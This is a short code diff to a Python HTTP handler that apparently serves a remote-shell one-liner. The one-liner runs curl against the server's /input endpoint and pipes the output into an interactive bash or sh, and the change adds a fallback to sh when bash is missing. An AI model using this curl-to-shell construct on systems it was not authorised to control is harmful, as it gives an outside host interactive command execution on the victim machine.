@@ -161,7 +161,7 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         proxy = ""
         if self.server.args.x:
             proxy = "-x " + self.server.args.x
-        shell = self.server.args.shell or "/usr/bin/env bash -il"
+        shell = self.server.args.shell or "{ command -v bash >/dev/null && { /usr/bin/env bash -il; true;} || /usr/bin/env sh -il;}"
         host = self.headers["Host"]
         cmd = f"exec curl {proxy} -X POST -sNk {schema}://{host}/input"
         cmd+= f" | {shell} 2>&1"
